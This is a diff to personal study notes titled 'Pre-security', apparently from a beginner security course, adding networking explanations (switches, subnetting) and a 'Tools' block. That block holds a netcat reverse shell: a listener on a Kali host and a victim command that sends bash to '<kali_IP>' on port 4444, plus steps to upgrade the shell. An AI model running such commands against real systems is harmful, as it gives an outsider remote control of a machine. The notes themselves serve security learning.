@@ -1,5 +1,22 @@
 # Pre-security
 
+# Tools
+
+```bash
+	# in kali
+	exec bash
+	nc -lvnp 4444
+
+	# in ubuntu7
+	nc <kali_IP> 4444 -e /bin/bash
+
+	# in kali reverseshell
+	python -c 'import pty;pty.spawn("/bin/bash")'
+	ctrl+z
+	stty raw -echo
+	reset
+```
+
 ## Network
 
 Networks are simply things connected.
@@ -58,6 +75,10 @@ Routing is useful when devices are connected by many paths.
 Switches are dedicated devices within a network that are designed to aggregate multiple other devices such as computers, printers, or any other networking-capable device using ethernet. These various devices plug into a switch's port. Switches are usually found in larger networks such as businesses, schools, or similar-sized networks, where there are many devices to connect to the network. Switches can connect a large number of devices by having ports of 4, 8, 16, 24, 32, and 64 for devices to plug into.
 
 Unlike Routers, these devices do not perform routing in the sense of directing paths along a certain route using the IP protocol. Instead, Switches use a technology called "packet switching" to break down pieces of data into smaller, more manageable chunks of data called packets. This technology allows for the efficiency of a network because large pieces of data take up more resources -- slowing down a busy network.
+
+## Subnetting
+
+Subnetting is the term given to splitting up a network into smaller, miniature networks within itself.
 
 # Social Engineering
 
